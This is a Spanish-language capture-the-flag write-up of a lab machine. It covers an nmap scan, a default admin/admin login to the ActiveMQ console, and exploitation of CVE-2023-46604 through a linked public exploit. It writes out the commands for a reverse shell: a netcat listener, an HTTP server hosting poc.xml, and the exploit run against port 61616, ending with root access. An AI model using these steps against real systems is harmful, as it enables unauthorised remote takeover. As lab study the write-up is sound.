# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ad7345a4-796d-4164-af6a-0e071b99319c)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **80/tcp (HTTP):** syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
2. **443/tcp (SSL/HTTP):** syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
3. **1883/tcp (MQTT):** syn-ack ttl 64
4. **5672/tcp (AMQP?):** syn-ack ttl 64
5. **8161/tcp (HTTP):** syn-ack ttl 64 Jetty 9.4.39.v20210325
6. **33833/tcp (TCPWRAPPED):** --
7. **61613/tcp (STOMP):** syn-ack ttl 64 Apache ActiveMQ
8. **61614/tcp (HTTP):** syn-ack ttl 64 Jetty 9.4.39.v20210325
9. **61616/tcp (APACHEMQ):** syn-ack ttl 64 ActiveMQ OpenWire transport

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Y se encontró la pagina por defecto de Apache2 Debian.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1a6926a2-5913-4843-936c-975dd57e593c)

# Fase 2- Exploración

#### 8161
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/482f72b7-db40-4fc3-a7c3-9373002801a5)
Al ir a ver lo que había en el puerto `8161 HTTP`, Nos encontramos con un login.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b0965c8a-d0fa-42a3-ad63-12a1928f1af2)
Probamos las credenciales de `admin` `admin` y estamos dentro! Es un apache `ActiveMQ`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ca21c347-c058-4c33-8e4f-e7cbc1e1862a)
Si vamos al apartado de `Manage ActiveMQ broker` vemos que la versión es la `5.15.15`.

# Fase 3- Explotación

#### 5.15.15
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2a833290-5e91-4d52-bf56-ffc9b888af9a)
Buscando algún exploit o algo encontré este repositorio en GitHub: https://github.com/evkl1d/CVE-2023-46604

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5868ee88-caba-4292-a0a5-bb531182e592)
Al ver lo que envía el exploit vemos que es una reverse shell, así que cambiaremos la ip a la nuestra y el puerto. 

Voy a detallar los comandos para obtener la reverse shell.
```python
Atacante > python3 -m http.server 80
Atacante > nc -nlvp 443
Atacante > sudo python exploit.py -i 172.17.0.2 -p 61616 -u http://172.17.0.1/poc.xml
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4f8b3591-af44-4b3c-b2fa-f7ba5a32f6f3)
Y estamos dentro! Como root!.


